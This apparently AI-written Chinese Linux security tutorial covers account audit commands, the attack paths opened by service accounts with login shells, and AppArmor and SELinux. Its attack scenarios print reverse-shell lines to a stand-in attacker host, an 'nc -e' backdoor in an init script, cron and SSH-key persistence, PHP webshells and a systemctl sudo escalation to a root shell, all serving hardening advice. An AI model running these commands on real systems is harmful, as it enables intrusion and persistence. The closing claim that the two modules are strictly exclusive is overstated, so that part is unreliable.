作為資安專家，我來為你詳細解釋這些系統安全檢查指令：

## 1. 檢查UID為0的非root帳號
```bash
awk -F: '$3 == 0 && $1 != "root" {print $1}' /etc/passwd
```
**檢查目的：** 找出除了root之外，還有哪些帳號擁有UID 0（超級用戶權限）

**潛在危害：**
- UID 0代表最高管理員權限，正常情況下只有root帳號應該擁有
- 如果發現其他帳號也有UID 0，可能是：
  - 系統被入侵，攻擊者建立了後門帳號
  - 管理員錯誤設定
  - 內部人員濫用權限

## 2. 檢查空密碼帳號
```bash
awk -F: '$2 == "" {print $1}' /etc/shadow
```
**檢查目的：** 找出密碼欄位為空的帳號

**潛在危害：**
- 空密碼帳號可以直接登入，無需認證
- 嚴重的安全漏洞，任何人都能冒用該帳號
- 違反密碼政策和合規要求

## 3. 檢查系統帳號有登入shell
```bash
awk -F: '$3 < 1000 && $3 > 0 && $7 !~ /(nologin|false)/ {print $1":"$7}' /etc/passwd
```
**檢查目的：** 找出UID小於1000（系統服務帳號）但允許登入的帳號

**潛在危害：**
- 系統服務帳號（如www-data、mysql等）通常不應該允許直接登入
- 如果這些帳號可以登入，攻擊者可能利用服務漏洞獲得shell存取權
- 增加攻擊面，違反最小權限原則

## 4. 檢查相同UID的帳號
```bash
awk -F: '{print $3}' /etc/passwd | sort -n | uniq -d
```
**檢查目的：** 找出重複的UID

**潛在危害：**
- 相同UID的帳號擁有相同權限
- 可能導致權限混亂和審計困難
- 攻擊者可能利用UID衝突來提升權限或隱藏活動

## 5. 檢查沒有密碼的帳號
```bash
passwd -S -a 2>/dev/null | grep " NP "
```
**檢查目的：** 使用passwd命令查看所有帳號狀態，找出標記為"NP"（No Password）的帳號

**潛在危害：**
- 與第2項類似，但使用不同方法檢查
- 沒有密碼的帳號可以被任意登入
- 嚴重違反安全基線

## 建議修復措施

1. **移除或修正異常UID 0帳號**
2. **為所有帳號設定強密碼**
3. **將系統服務帳號的shell改為/sbin/nologin或/bin/false**
4. **修正重複的UID問題**
5. **建立定期安全檢查流程**
6. **實施密碼政策和帳號管理制度**

這些檢查都是Linux系統安全基線檢查的重要項目，建議定期執行以確保系統安全。


## 系統帳號有登入shell的詳細危害分析

### 什麼是系統帳號？
系統帳號是為系統服務和程序運行而創建的特殊帳號，通常UID < 1000，例如：
- `www-data` (Apache/Nginx網頁服務)
- `mysql` (MySQL資料庫服務)
- `postgres` (PostgreSQL資料庫)
- `redis` (Redis服務)
- `daemon`, `bin`, `sys` 等系統程序帳號

### 正常設計原則
這些帳號設計上應該：
- 只用於運行特定服務
- 不允許互動式登入
- shell設為 `/sbin/nologin` 或 `/bin/false`
- 沒有家目錄或家目錄受限

### 詳細危害分析

#### 1. 服務漏洞升級攻擊
**攻擊流程：**
```
Web應用漏洞 → RCE(遠程代碼執行) → 獲得www-data shell → 橫向移動
```

**實際案例：**
- 攻擊者發現網站SQL注入漏洞
- 利用`INTO OUTFILE`寫入webshell
- 通過webshell執行系統命令，此時是`www-data`權限
- 如果`www-data`有登入shell，攻擊者可以：
  ```bash
  # 建立SSH連接
  ssh-keygen -t rsa
  mkdir ~/.ssh
  echo "攻擊者公鑰" >> ~/.ssh/authorized_keys
  
  # 或者反向shell
  bash -i >& /dev/tcp/攻擊者IP/4444 0>&1
  ```

#### 2. 權限提升路徑
**常見提權方式：**

**A. 利用sudo配置錯誤**
```bash
# 檢查sudo權限
sudo -l
# 可能發現類似配置：
# www-data ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2
# 攻擊者可能利用systemctl的GTFOBins提權
```

**B. 利用SUID程序**
```bash
# 尋找SUID程序
find / -perm -4000 -type f 2>/dev/null
# 利用find、vim等SUID程序提權
```

**C. 利用crontab和服務配置**
```bash
# 檢查可寫的配置文件
find /etc -writable -type f 2>/dev/null
# 修改服務配置文件，等待服務重啟時執行惡意代碼
```

#### 3. 持久化攻擊
**建立後門：**
```bash
# 在服務帳號下建立定時任務
(crontab -l ; echo "* * * * * /tmp/backdoor.sh") | crontab -

# 修改服務啟動腳本
echo "nc -e /bin/bash 攻擊者IP 4444 &" >> /etc/init.d/apache2

# 在網頁目錄建立webshell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

#### 4. 橫向移動
**內網滲透：**
```bash
# 掃描內網
nmap -sn 192.168.1.0/24

# 查看網絡配置和連接
netstat -antup
ss -tulpn

# 查看其他服務的配置文件，尋找密碼
grep -r "password" /etc/
find /var -name "*.conf" -exec grep -l "password" {} \;
```

### 實際攻擊場景範例

#### 場景1：Web應用攻擊
```bash
# 1. 攻擊者通過文件上傳漏洞獲得webshell
# 2. 執行系統命令，發現是www-data權限且有shell
whoami  # www-data
echo $SHELL  # /bin/bash (危險！應該是/sbin/nologin)

# 3. 建立反向shell
bash -c 'exec bash -i &>/dev/tcp/attacker.com/4444 <&1'

# 4. 在攻擊者機器上獲得穩定shell後
# 檢查sudo權限
sudo -l
# 發現：www-data ALL=(root) NOPASSWD: /usr/bin/systemctl restart apache2

# 5. 利用systemctl提權
sudo systemctl edit apache2
# 在編輯器中添加：
[Service]
ExecStartPre=+/bin/bash -c 'cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell'

# 6. 重啟服務觸發提權
sudo systemctl restart apache2
/tmp/rootshell -p  # 獲得root權限
```

#### 場景2：服務配置文件攻擊
```bash
# 1. 通過應用漏洞獲得mysql帳號權限
# 2. 發現mysql帳號有shell且可寫入配置目錄
ls -la /etc/mysql/conf.d/  # drwxrwxr-x mysql mysql

# 3. 建立惡意配置文件
cat > /etc/mysql/conf.d/backdoor.cnf << EOF
[mysqld]
init-file = /tmp/evil.sql
EOF

# 4. 建立惡意SQL文件
cat > /tmp/evil.sql << EOF
SELECT '<?php system(\$_GET["c"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php';
EOF

# 5. 等待MySQL服務重啟，backdoor.php被創建
```

### 防護建議

#### 1. 系統配置強化
```bash
# 檢查所有系統帳號的shell設定
awk -F: '$3 < 1000 && $3 > 0 {print $1":"$7}' /etc/passwd

# 修正系統帳號shell
usermod -s /sbin/nologin www-data
usermod -s /sbin/nologin mysql
usermod -s /sbin/nologin redis
```

#### 2. 服務安全配置
```bash
# 限制服務帳號的系統能力
# 在systemd服務文件中添加：
[Service]
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadOnlyPaths=/
ReadWritePaths=/var/log/apache2 /var/run/apache2
```

#### 3. 監控和檢測
```bash
# 定期檢查登入記錄
who -a
last -f /var/log/wtmp

# 監控異常進程
ps aux | grep -E "(nc|netcat|bash.*tcp|python.*socket)"

# 檢查異常網絡連接
netstat -antup | grep ESTABLISHED
```

#### 4. SELinux/AppArmor
啟用並正確配置SELinux或AppArmor，限制服務帳號的系統訪問能力。

這種漏洞看似簡單，但在實際攻擊中是非常有效的橫向移動和權限提升路徑，必須嚴格防範。




## AppArmor 完整介紹

### AppArmor 基本概念

**AppArmor (Application Armor)** 是一個Linux安全模組，提供**強制存取控制 (Mandatory Access Control, MAC)**，用來限制程序能夠存取的系統資源。

### 與傳統權限系統的差異

#### 傳統 DAC (Discretionary Access Control)
```bash
# 傳統權限：只要你是root，就能做任何事
sudo rm -rf /  # root可以刪除整個系統
```

#### AppArmor MAC (Mandatory Access Control)
```bash
# 即使程序以root權限運行，也受AppArmor策略限制
# 例如：Apache即使被攻破，也只能訪問允許的目錄
```

### AppArmor 工作原理

#### 1. 基於路徑的存取控制
```bash
# AppArmor設定檔範例 (/etc/apparmor.d/usr.sbin.apache2)
/usr/sbin/apache2 {
  # 可讀取的目錄
  /var/www/** r,
  /etc/apache2/** r,
  
  # 可寫入的目錄
  /var/log/apache2/** w,
  /var/run/apache2.pid w,
  
  # 禁止存取
  deny /etc/shadow r,
  deny /etc/passwd w,
  
  # 網路權限
  network inet stream,
  network inet dgram,
}
```

#### 2. 三種執行模式

**Enforce 模式（強制模式）**
- 嚴格執行策略
- 違反策略的操作會被阻止
- 記錄違規行為到日誌

**Complain 模式（抱怨模式）**
- 不阻止操作，但記錄違規
- 用於測試和開發策略
- 相當於"學習模式"

**Disable 模式（停用模式）**
- 完全停用該程序的AppArmor保護

### 實際操作範例

#### 1. 檢查 AppArmor 狀態
```bash
# 檢查AppArmor是否啟用
sudo systemctl status apparmor

# 查看所有策略狀態
sudo aa-status

# 輸出範例：
# apparmor module is loaded.
# 15 profiles are loaded.
# 12 profiles are in enforce mode.
#    /usr/sbin/apache2
#    /usr/sbin/mysqld
# 3 profiles are in complain mode.
#    /usr/bin/firefox
```

#### 2. 管理 AppArmor 策略
```bash
# 將程序設為complain模式
sudo aa-complain /usr/sbin/apache2

# 將程序設為enforce模式
sudo aa-enforce /usr/sbin/apache2

# 停用程序的AppArmor
sudo aa-disable /usr/sbin/apache2

# 重新載入策略
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.apache2
```

#### 3. 查看和分析日誌
```bash
# 查看AppArmor日誌
sudo grep apparmor /var/log/syslog

# 或者使用專門的工具
sudo aa-logprof

# 日誌範例：
# kernel: audit: type=1400 audit(1692547200.123:456): apparmor="DENIED" 
# operation="open" profile="/usr/sbin/apache2" name="/etc/shadow" 
# pid=1234 comm="apache2" requested_mask="r" denied_mask="r"
```

### AppArmor 策略文件詳解

#### 1. 基本語法
```bash
# /etc/apparmor.d/usr.bin.example
/usr/bin/example {
  # 包含基本權限
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  # 文件權限
  /etc/example/** r,           # 遞迴讀取
  /var/log/example.log w,      # 寫入權限
  /tmp/** rw,                  # 讀寫權限
  /home/*/.example/** rw,      # 用戶目錄訪問
  
  # 執行權限
  /bin/bash ix,                # 繼承執行
  /usr/bin/grep Px,            # 新profile執行
  
  # 網路權限
  network inet stream,         # TCP連線
  network inet dgram,          # UDP連線
  
  # 系統呼叫限制
  capability dac_override,     # 覆蓋文件權限
  capability setuid,           # 改變用戶ID
  
  # 明確拒絕
  deny /etc/passwd w,          # 禁止寫入passwd
  deny /proc/*/mem r,          # 禁止讀取進程記憶體
}
```

#### 2. 常用權限標記
```bash
r    # 讀取
w    # 寫入
x    # 執行
m    # 記憶體映射
k    # 檔案鎖定
l    # 硬連結
ix   # 繼承執行（沿用當前profile）
Px   # 離散執行（切換到新profile）
Ux   # 不受限執行（危險！）
```

### 實際安全場景應用

#### 1. Web服務器防護
```bash
# /etc/apparmor.d/usr.sbin.apache2
/usr/sbin/apache2 {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/apache2-common>
  
  # 只允許存取網頁目錄
  /var/www/** r,
  /var/www/html/** r,
  
  # 上傳目錄限制
  /var/www/uploads/** rw,
  deny /var/www/uploads/** x,  # 禁止執行上傳的文件
  
  # 系統敏感文件保護
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /home/** r,
  
  # 限制網路連線
  network inet stream,
  deny network raw,            # 禁止原始socket
  
  # 限制系統呼叫
  deny capability sys_admin,   # 禁止系統管理權限
  deny @{PROC}/*/mem r,        # 禁止讀取進程記憶體
}
```

#### 2. 資料庫服務防護
```bash
# /etc/apparmor.d/usr.sbin.mysqld
/usr/sbin/mysqld {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/mysql>
  
  # 資料庫文件存取
  /var/lib/mysql/** rwk,
  /var/lib/mysql-files/** rw,
  
  # 設定檔存取
  /etc/mysql/** r,
  
  # 限制系統存取
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /home/** rwx,
  deny /root/** rwx,
  
  # 網路限制
  network inet stream,
  network inet dgram,
  deny network raw,
  
  # 禁止執行系統命令
  deny /bin/** x,
  deny /usr/bin/** x,
}
```

### AppArmor vs SELinux 比較

| 特點 | AppArmor | SELinux |
|------|----------|---------|
| **學習曲線** | 較簡單 | 較複雜 |
| **設定方式** | 基於文件路徑 | 基於標籤和上下文 |
| **預設發行版** | Ubuntu, SUSE | Red Hat, CentOS, Fedora |
| **策略語法** | 人類可讀 | 較抽象 |
| **細緻度** | 中等 | 非常細緻 |
| **效能影響** | 較小 | 中等 |

### 開發和測試 AppArmor 策略

#### 1. 使用 Complain 模式學習
```bash
# 設定為學習模式
sudo aa-complain /usr/bin/myapp

# 執行應用程序，進行各種操作
./myapp --test-all-features

# 分析日誌並生成策略
sudo aa-logprof
# 這個工具會互動式地幫你建立策略規則
```

#### 2. 策略測試
```bash
# 測試策略語法
sudo apparmor_parser -Q /etc/apparmor.d/usr.bin.myapp

# 載入並測試策略
sudo apparmor_parser -r /etc/apparmor.d/usr.bin.myapp

# 切換到強制模式測試
sudo aa-enforce /usr/bin/myapp
```

### 常見問題與解決

#### 1. 應用程序無法正常運作
```bash
# 檢查AppArmor拒絕日誌
sudo grep DENIED /var/log/syslog | tail -10

# 暫時設為complain模式
sudo aa-complain /path/to/program

# 或完全停用
sudo aa-disable /path/to/program
```

#### 2. 自訂程序策略
```bash
# 為新程序建立策略
sudo aa-genprof /usr/local/bin/myapp

# 系統會引導你執行程序並記錄需要的權限
```

### 最佳實務建議

1. **漸進式部署**：先用 complain 模式測試
2. **定期檢查日誌**：監控是否有誤報
3. **最小權限原則**：只給必要的權限
4. **定期更新策略**：隨應用程序更新而調整
5. **測試環境驗證**：在正式環境前充分測試

AppArmor 是一個強大而相對簡單的安全工具，特別適合用來限制網路服務和關鍵應用程序的權限，有效減少系統被攻破後的損害範圍。



## 是的！AppArmor 會限制 root 權限程序

這是 AppArmor 最重要的安全特性之一：**即使程序以 root 身份運行，也必須遵守 AppArmor 策略的限制**。

### 具體驗證範例

#### 1. Apache 以 root 啟動的例子
```bash
# Apache 主程序通常以 root 啟動（綁定 80 端口）
ps aux | grep apache
# root      1234  ... /usr/sbin/apache2 -DFOREGROUND
# www-data  1235  ... /usr/sbin/apache2 -DFOREGROUND

# 即使主程序是 root，仍受 AppArmor 限制
sudo aa-status
# /usr/sbin/apache2 (enforce)  ← 表示受到強制限制
```

#### 2. 實際測試：root 程序被 AppArmor 阻止
```bash
# 建立測試程序的 AppArmor 策略
sudo nano /etc/apparmor.d/usr.bin.test-root

# 內容：
/usr/bin/test-root {
  #include <abstractions/base>
  
  # 只允許讀取 /tmp
  /tmp/** r,
  
  # 明確拒絕存取 /etc/passwd
  deny /etc/passwd r,
}

# 建立測試程序
sudo nano /usr/bin/test-root
#!/bin/bash
echo "我是 $(whoami)，UID=$(id -u)"
echo "嘗試讀取 /etc/passwd："
cat /etc/passwd

# 設定權限並載入策略
sudo chmod +x /usr/bin/test-root
sudo apparmor_parser -r /etc/apparmor.d/usr.bin.test-root
sudo aa-enforce /usr/bin/test-root

# 以 root 身份執行測試
sudo /usr/bin/test-root
```

**結果：**
```
我是 root，UID=0
嘗試讀取 /etc/passwd：
cat: /etc/passwd: Permission denied
```

**系統日誌：**
```bash
sudo grep DENIED /var/log/syslog | tail -1
# apparmor="DENIED" operation="open" profile="/usr/bin/test-root" 
# name="/etc/passwd" pid=5678 comm="cat" requested_mask="r" denied_mask="r"
```

### 更複雜的測試案例

#### 3. root 程序無法寫入系統文件
```bash
# AppArmor 策略限制 root 程序
/usr/bin/dangerous-root {
  #include <abstractions/base>
  
  # 只允許寫入 /tmp
  /tmp/** rw,
  
  # 拒絕寫入系統關鍵文件
  deny /etc/** w,
  deny /boot/** w,
  deny /usr/** w,
}

# 測試程序
#!/bin/bash
echo "我是 root，但仍然受限："
echo "嘗試修改 /etc/hosts："
echo "127.0.0.1 evil.com" >> /etc/hosts 2>&1 || echo "被 AppArmor 阻止！"

echo "嘗試在 /tmp 寫入："
echo "test" > /tmp/allowed.txt && echo "成功寫入 /tmp！"
```

#### 4. 網路服務的真實案例
```bash
# nginx 以 root 啟動但受 AppArmor 限制
sudo systemctl start nginx
ps aux | grep nginx
# root      1111  ... nginx: master process
# www-data  2222  ... nginx: worker process

# 檢查 AppArmor 策略
cat /etc/apparmor.d/usr.sbin.nginx
```

**nginx AppArmor 策略範例：**
```bash
/usr/sbin/nginx {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  # 即使是 root 程序，也不能存取這些
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /home/** r,
  deny /root/** r,
  
  # 只能存取網頁相關目錄
  /var/www/** r,
  /etc/nginx/** r,
  /var/log/nginx/** w,
  
  # 網路權限限制
  network inet stream,
  deny network raw,  # 即使是 root 也不能使用原始 socket
}
```

### AppArmor 如何覆蓋 root 權限

#### 1. 核心層面的攔截
```
應用程序系統呼叫 → Linux 核心 → AppArmor LSM 模組檢查 → 允許/拒絕
                                    ↑
                           即使是 root 也要通過這裡
```

#### 2. 具體的系統呼叫攔截
```bash
# 當 root 程序嘗試 open("/etc/shadow", O_RDONLY) 時：
# 1. 核心接收到系統呼叫
# 2. AppArmor 檢查策略：deny /etc/shadow r
# 3. 返回 -EACCES (Permission denied)
# 4. 即使呼叫者是 root (UID=0) 也被拒絕
```

### 實際攻擊防護場景

#### 情境：Web 應用被攻破，獲得 root shell
```bash
# 攻擊者通過漏洞獲得 root 權限的 web shell
# 但仍受 AppArmor 限制

# 嘗試讀取敏感文件
cat /etc/shadow
# Permission denied (AppArmor 阻止)

# 嘗試修改系統文件
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
# Permission denied (AppArmor 阻止)

# 嘗試安裝後門
cp /tmp/backdoor /usr/bin/
# Permission denied (AppArmor 阻止)

# 只能在允許的目錄操作
echo "limited access" > /var/www/html/test.txt
# 成功 (AppArmor 允許)
```

### 重要限制和例外

#### 1. AppArmor 不是萬能的
```bash
# 如果策略配置錯誤，仍可能被繞過
/dangerous-program {
  /etc/** rw,  # 太寬鬆的權限
  capability sys_admin,  # 危險的系統權限
  /bin/** Ux,  # 不受限執行其他程序
}
```

#### 2. 未受保護的程序
```bash
# 檢查哪些程序沒有 AppArmor 保護
sudo aa-unconfined
# 這些程序如果以 root 運行，仍有完整權限
```

#### 3. AppArmor 自身的管理
```bash
# root 仍然可以管理 AppArmor（如果有適當權限）
sudo aa-disable /usr/sbin/apache2
sudo systemctl stop apparmor

# 但可以透過策略限制這些操作
```

### 最佳實務：縱深防禦

#### 1. 結合其他安全措施
```bash
# AppArmor + 最小權限執行
User=www-data
Group=www-data
# 程序不需要 root 啟動

# AppArmor + systemd 安全特性
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
```

#### 2. 監控和警報
```bash
# 監控 AppArmor 拒絕事件
sudo tail -f /var/log/syslog | grep DENIED

# 設定警報
echo "* * * * * root grep DENIED /var/log/syslog | tail -1 | mail -s 'AppArmor Alert' admin@example.com" >> /etc/crontab
```

### 總結

**AppArmor 確實可以限制 root 權限程序**，這是現代 Linux 安全的重要特性：

1. **核心層面控制**：在系統呼叫層面攔截，無視用戶權限
2. **策略優先**：AppArmor 策略比傳統 Unix 權限優先級更高  
3. **縱深防禦**：即使攻擊者獲得 root，仍受到限制
4. **但非萬能**：需要正確配置和其他安全措施配合

這就是為什麼 AppArmor 被稱為 "強制存取控制" (MAC) 而非 "選擇性存取控制" (DAC) 的原因。


# SELinux 完整介紹

## SELinux 基本概念

**SELinux (Security-Enhanced Linux)** 是由美國國家安全局 (NSA) 開發的強制存取控制 (MAC) 安全框架，提供比傳統 Unix 權限更細緻的安全控制。

### 核心設計理念

#### 1. 最小權限原則 (Principle of Least Privilege)
每個程序只能存取完成工作所需的最少資源。

#### 2. 強制存取控制 (Mandatory Access Control)
系統管理員定義安全策略，即使是 root 也無法繞過。

#### 3. 類型強制 (Type Enforcement)
每個檔案、程序、用戶都有安全標籤，存取基於標籤規則。

## SELinux vs 傳統權限系統

### 傳統 DAC (自主存取控制)
```bash
# 傳統權限：檔案擁有者可以隨意修改權限
chmod 777 /etc/passwd  # 危險但允許
chown user:user /etc/shadow  # root 可以這樣做
```

### SELinux MAC (強制存取控制)
```bash
# SELinux：即使 root 也受安全策略限制
# 嘗試修改 /etc/passwd 會被 SELinux 阻止
echo "hacker:x:0:0::/:/bin/bash" >> /etc/passwd
# setsebool 或策略規則決定是否允許
```

## SELinux 核心概念

### 1. 安全上下文 (Security Context)
每個物件都有安全標籤，格式：`user:role:type:level`

```bash
# 查看檔案的安全上下文
ls -Z /etc/passwd
# system_u:object_r:passwd_file_t:s0

# 查看程序的安全上下文
ps -eZ | grep httpd
# system_u:system_r:httpd_t:s0
```

**各部分解釋：**
- **user**: SELinux 用戶 (不是系統用戶)
- **role**: 用戶角色
- **type**: 最重要的部分，定義存取規則
- **level**: MLS/MCS 安全等級 (可選)

### 2. 三種運作模式

#### Enforcing (強制模式)
```bash
# 嚴格執行 SELinux 策略
getenforce
# Enforcing

# 違規操作會被阻止並記錄
```

#### Permissive (寬容模式)
```bash
# 不阻止操作，但記錄違規
setenforce 0
getenforce
# Permissive

# 用於測試和除錯
```

#### Disabled (停用模式)
```bash
# 完全停用 SELinux (需要重開機)
# 編輯 /etc/selinux/config
SELINUX=disabled
```

### 3. 策略類型

#### Targeted Policy (目標策略) - 預設
- 只保護特定的網路服務 (httpd, named, dhcpd 等)
- 其他程序在 `unconfined_t` 域中執行
- 最常用的策略

#### Strict Policy (嚴格策略)
- 所有程序都受 SELinux 控制
- 更安全但設定複雜

#### MLS Policy (多層安全策略)
- 支援機密等級分類
- 政府和軍事環境使用

## SELinux 實際操作

### 1. 基本狀態檢查
```bash
# 查看 SELinux 狀態
sestatus
# SELinux status:                 enabled
# SELinuxfs mount:                /sys/fs/selinux
# SELinux root directory:         /etc/selinux
# Loaded policy name:             targeted
# Current mode:                   enforcing
# Mode from config file:          enforcing

# 查看當前模式
getenforce

# 查看布林值設定
getsebool -a | head -10
```

### 2. 文件和程序上下文
```bash
# 查看文件上下文
ls -Z /var/www/html/
# -rw-r--r--. apache apache unconfined_u:object_r:httpd_content_t:s0 index.html

# 查看程序上下文
ps -eZ | grep httpd
# system_u:system_r:httpd_t:s0    1234 ?    00:00:05 httpd

# 查看用戶上下文
id -Z
# unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### 3. 修改安全上下文
```bash
# 變更文件類型
chcon -t httpd_content_t /var/www/html/test.html

# 遞迴變更目錄
chcon -R -t httpd_content_t /var/www/html/

# 恢復預設上下文
restorecon /var/www/html/test.html
restorecon -R /var/www/html/
```

## SELinux 策略管理

### 1. 布林值 (Booleans) 管理
```bash
# 查看所有布林值
getsebool -a

# 查看特定服務的布林值
getsebool -a | grep httpd
# httpd_can_network_connect --> off
# httpd_can_network_connect_db --> off
# httpd_enable_cgi --> on

# 暫時修改布林值
setsebool httpd_can_network_connect on

# 永久修改布林值
setsebool -P httpd_can_network_connect on

# 常用的 httpd 布林值
setsebool -P httpd_can_network_connect on      # 允許 HTTP 對外連線
setsebool -P httpd_can_network_connect_db on   # 允許連接資料庫
setsebool -P httpd_enable_cgi on               # 允許 CGI
setsebool -P httpd_enable_homedirs on          # 允許存取用戶家目錄
```

### 2. 端口管理
```bash
# 查看 SELinux 端口類型
semanage port -l | grep http
# http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000

# 添加新端口
semanage port -a -t http_port_t -p tcp 8080

# 刪除端口
semanage port -d -t http_port_t -p tcp 8080

# 修改端口類型
semanage port -m -t http_port_t -p tcp 8080
```

### 3. 文件上下文規則
```bash
# 查看文件上下文規則
semanage fcontext -l | grep httpd

# 添加新的文件上下文規則
semanage fcontext -a -t httpd_content_t "/web(/.*)?"

# 應用新規則
restorecon -R /web

# 刪除規則
semanage fcontext -d "/web(/.*)?"
```

## 實際應用場景

### 1. Web 服務器安全配置

#### Apache/Nginx 基本設定
```bash
# 確保網頁目錄有正確的上下文
ls -Z /var/www/html/
# httpd_content_t 類型是必需的

# 如果上下文錯誤，修正它
restorecon -R /var/www/html/

# 或者設定新的上下文規則
semanage fcontext -a -t httpd_content_t "/var/www/mysite(/.*)?"
restorecon -R /var/www/mysite/
```

#### 允許 Apache 連接資料庫
```bash
# 預設情況下 Apache 不能連接資料庫
# 需要啟用相關布林值
setsebool -P httpd_can_network_connect_db on

# 或者允許所有網路連接
setsebool -P httpd_can_network_connect on
```

#### 自訂端口配置
```bash
# 如果 Apache 使用非標準端口 (例如 8080)
semanage port -a -t http_port_t -p tcp 8080

# 檢查是否成功添加
semanage port -l | grep 8080
```

### 2. 資料庫服務安全

#### MySQL/MariaDB 設定
```bash
# 查看資料庫相關的布林值
getsebool -a | grep mysql

# 允許資料庫網路連接
setsebool -P mysql_connect_any on

# 確保資料庫文件有正確上下文
ls -Z /var/lib/mysql/
# mysqld_db_t 類型是正確的

# 如果需要自訂資料目錄
semanage fcontext -a -t mysqld_db_t "/data/mysql(/.*)?"
restorecon -R /data/mysql/
```

### 3. SSH 服務安全
```bash
# 如果使用非標準 SSH 端口
semanage port -a -t ssh_port_t -p tcp 2222

# 查看 SSH 相關布林值
getsebool -a | grep ssh
```

## 除錯和故障排除

### 1. 查看 SELinux 拒絕日誌
```bash
# 查看 audit 日誌
grep AVC /var/log/audit/audit.log | tail -10

# 使用 ausearch 工具
ausearch -m avc -ts recent

# 日誌範例：
# type=AVC msg=audit(1692547200.123:456): avc: denied { write } 
# for pid=1234 comm="httpd" name="test.log" dev="dm-0" ino=123456 
# scontext=system_u:system_r:httpd_t:s0 
# tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file
```

### 2. 使用 sealert 分析
```bash
# 安裝分析工具
yum install setroubleshoot-server

# 分析最近的 AVC 拒絕
sealert -a /var/log/audit/audit.log

# 或者即時監控
sealert -b
```

### 3. audit2allow 生成策略
```bash
# 從 audit 日誌生成允許規則
grep httpd /var/log/audit/audit.log | audit2allow

# 輸出範例：
# #============= httpd_t ==============
# allow httpd_t admin_home_t:file write;

# 生成並載入自訂模組
grep httpd /var/log/audit/audit.log | audit2allow -M myhttpd
semodule -i myhttpd.pp
```

## 實際攻擊防護案例

### 案例 1：Web Shell 攻擊防護
```bash
# 攻擊者上傳 webshell 到 /var/www/html/
# 但由於 SELinux，webshell 無法執行系統命令

# /var/www/html/shell.php 內容：
# <?php system($_GET['cmd']); ?>

# 當攻擊者訪問：
# http://target.com/shell.php?cmd=cat /etc/passwd

# SELinux 阻止：
# avc: denied { read } for pid=1234 comm="cat" name="passwd" 
# scontext=system_u:system_r:httpd_t:s0 
# tcontext=system_u:object_r:passwd_file_t:s0 tclass=file
```

### 案例 2：資料庫提權攻擊防護
```bash
# 攻擊者利用 SQL 注入獲得資料庫權限
# 嘗試寫入 webshell：
# SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

# SELinux 阻止：
# avc: denied { write } for pid=5678 comm="mysqld" name="html" 
# scontext=system_u:system_r:mysqld_t:s0 
# tcontext=system_u:object_r:httpd_content_t:s0 tclass=dir

# mysqld_t 類型無法寫入 httpd_content_t 目錄
```

### 案例 3：容器逃逸防護
```bash
# 即使攻擊者逃出容器獲得 root
# 仍受 SELinux 容器策略限制

# 查看容器程序上下文
ps -eZ | grep container
# system_u:system_r:container_t:s0:c123,c456

# container_t 類型被嚴格限制，無法存取主機資源
```

## SELinux 最佳實務

### 1. 漸進式部署
```bash
# 1. 先設定為 Permissive 模式
setenforce 0

# 2. 運行系統一段時間，收集日誌
# 3. 分析並調整策略
# 4. 切換到 Enforcing 模式
setenforce 1
```

### 2. 定期監控
```bash
# 設定日誌輪轉
# /etc/logrotate.d/audit

# 監控腳本
#!/bin/bash
if ausearch -m avc -ts today | grep -q denied; then
    echo "SELinux 拒絕事件偵測到" | mail -s "SELinux Alert" admin@example.com
fi
```

### 3. 備份策略設定
```bash
# 備份自訂模組
semodule -l > /backup/selinux-modules.list

# 備份布林值設定
getsebool -a > /backup/selinux-booleans.conf

# 備份文件上下文
semanage fcontext -l > /backup/selinux-fcontext.conf
```

### 4. 效能最佳化
```bash
# 減少不必要的 audit 記錄
auditctl -D  # 清除所有規則
auditctl -e 1  # 啟用 audit
# 只記錄重要事件

# 調整 audit 緩衝區大小
# /etc/audit/auditd.conf
num_logs = 10
max_log_file = 50
```

## SELinux vs AppArmor 比較

| 特點 | SELinux | AppArmor |
|------|---------|----------|
| **學習曲線** | 非常陡峭 | 較容易 |
| **控制細緻度** | 極其細緻 | 中等 |
| **策略複雜度** | 高度複雜 | 相對簡單 |
| **標籤系統** | 安全上下文標籤 | 路徑基礎 |
| **效能影響** | 中等到高 | 較小 |
| **預設發行版** | RHEL, CentOS, Fedora | Ubuntu, SUSE |
| **政府認證** | NSA 開發，多項認證 | 較少認證 |
| **企業採用** | 銀行、政府廣泛使用 | 主要是 Ubuntu 環境 |

## 總結

SELinux 是功能最強大但也最複雜的 Linux 安全框架：

**優點：**
- 極其細緻的安全控制
- 經過政府級安全認證
- 可以防護零日攻擊
- 即使 root 被攻破也有保護

**缺點：**
- 學習曲線陡峭
- 設定複雜容易出錯
- 除錯困難
- 效能開銷較大

**適用場景：**
- 高安全需求環境（政府、軍事、金融）
- Red Hat 生態系統
- 需要合規認證的環境
- 有專業安全團隊維護

對於一般企業，建議先從 AppArmor 開始學習 MAC 概念，再進階到 SELinux。

## AppArmor 和 SELinux 是互斥的，不能同時運行

### 為什麼不能同時使用？

#### 1. 核心層面的衝突
```bash
# 兩者都是 Linux Security Module (LSM) 框架的實作
# Linux 核心在編譯時只能選擇一個主要的 LSM

# 檢查當前使用的 LSM
cat /sys/kernel/security/lsm
# 可能的輸出：
# capability,selinux                    # 使用 SELinux
# capability,apparmor                   # 使用 AppArmor
# capability,yama,apparmor             # Ubuntu 典型配置
```

#### 2. 系統呼叫攔截衝突
```
應用程序 → 系統呼叫 → 核心 → LSM 框架 → [SELinux 或 AppArmor]
                                    ↑
                               只能有一個主導
```

#### 3. 實際驗證測試
```bash
# 在 Ubuntu 系統 (預設 AppArmor)
sudo apt install selinux-basics selinux-policy-default
